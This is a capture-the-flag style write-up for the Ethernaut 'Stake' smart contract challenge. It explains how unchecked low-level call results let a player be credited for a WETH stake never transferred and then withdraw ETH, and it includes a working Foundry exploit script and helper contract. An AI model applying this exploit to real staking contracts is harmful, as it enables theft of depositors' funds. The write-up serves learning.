# Ethernaut Level 31 Stake

---

Contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract Stake {

    uint256 public totalStaked;
    mapping(address => uint256) public UserStake;
    mapping(address => bool) public Stakers;
    address public WETH;

    constructor(address _weth) payable{
        totalStaked += msg.value;
        WETH = _weth;
    }

    function StakeETH() public payable {
        require(msg.value > 0.001 ether, "Don't be cheap");
        totalStaked += msg.value;
        UserStake[msg.sender] += msg.value;
        Stakers[msg.sender] = true;
    }
    function StakeWETH(uint256 amount) public returns (bool){
        require(amount >  0.001 ether, "Don't be cheap");
        (,bytes memory allowance) = WETH.call(abi.encodeWithSelector(0xdd62ed3e, msg.sender,address(this)));
        require(bytesToUint(allowance) >= amount,"How am I moving the funds honey?");
        totalStaked += amount;
        UserStake[msg.sender] += amount;
        (bool transfered, ) = WETH.call(abi.encodeWithSelector(0x23b872dd, msg.sender,address(this),amount));
        Stakers[msg.sender] = true;
        return transfered;
    }

    function Unstake(uint256 amount) public returns (bool){
        require(UserStake[msg.sender] >= amount,"Don't be greedy");
        UserStake[msg.sender] -= amount;
        totalStaked -= amount;
        (bool success, ) = payable(msg.sender).call{value : amount}("");
        return success;
    }
    function bytesToUint(bytes memory data) internal pure returns (uint256) {
        require(data.length >= 32, "Data length must be at least 32 bytes");
        uint256 result;
        assembly {
            result := mload(add(data, 0x20))
        }
        return result;
    }
}
```

We have to check all three conditions:

1. ☑️ `0 < Stake's ETH balance < totalStaked`;
2. ☑️ EOA is a staker;
3. ☑️ EOA's stake balance = 0.

There's a fundamental vulnerability in the code: every returned `bool success` from the low-level calls in functions is not properly handled. For example, this call `(bool transfered, ) = WETH.call(abi.encodeWithSelector(0x23b872dd, msg.sender,address(this),amount));` is not properly handled because it does not revert if the call is not successful. Thus, even if the inner logic from the `WETH` address has reverts, our attack scripts won't break, these reverts are just some returndata from the call. 

We can take advantage of that and implement out attack logic. In function `StakeWETH(uint256 amount)`, if we look up the selector functions, we know that we first call `allowance` to check for stake's allowance and `transferFrom` to transfer to stake some `weth`. We can call `approve` to increase the amount of allowance, but we will never have actual `weth` to transfer from. However, it doesn't matter since all the states still update even though the call fails!

Also, for function `Unstake`, we can see that players can unstake Eth no matter what kind of token they have staked. Given all that, we have a plan:

1. Dummy stakes A + 2 ETH. (A = 0.001 ether);
2. EOA stakes A + 1 WETH.
3. EOA unstakes A + 1 ETH.

After all that complete, 

1. ✅ `0 < Stake's ETH balance (1 wei) < totalStaked (0.001 ether + 2 wei)`;
2. ✅ EOA is a staker;
3. ✅ EOA's stake balance = 0.

`Dummy.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Stake} from "./Stake.sol";

contract Dummy {
    Stake stake;

    constructor(address _stakeAddress) payable { 
        stake = Stake(_stakeAddress);
    }

    function stakeEth(uint256 value) external {
        stake.StakeETH{value: value}();
    } 
}
```

`Stake.s.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Stake} from "../src/Stake.sol";
import {Dummy} from "../src/Dummy.sol";

contract StakeScript is Script {
    address stakeAddress = 0xXXXXXXXXXXX;
    Stake stake = Stake(stakeAddress);
    Dummy dummy;
    uint256 constant STAKE_AMOUNT = 0.001 ether;
    uint256 constant MARGIN = 1 wei;

    function run() external {
        vm.startBroadcast();
        dummy = new Dummy{value: STAKE_AMOUNT + MARGIN * 2}(stakeAddress);
        dummy.stakeEth(STAKE_AMOUNT + MARGIN * 2);

        address weth = stake.WETH();
        (bool success, ) = weth.call(abi.encodeWithSignature(
            "approve(address,uint256)", 
            stakeAddress, 
            type(uint256).max
        ));
        require(success, "Approval failed");

        stake.StakeWETH(STAKE_AMOUNT + MARGIN);
        stake.Unstake(STAKE_AMOUNT + MARGIN);
        vm.stopBroadcast();
        console.log("Stake Eth balance:", stakeAddress.balance);
        console.log("Stake totalStaked:", stake.totalStaked());
        console.log("EOA Stake:", stake.UserStake(msg.sender));
    }
}
```

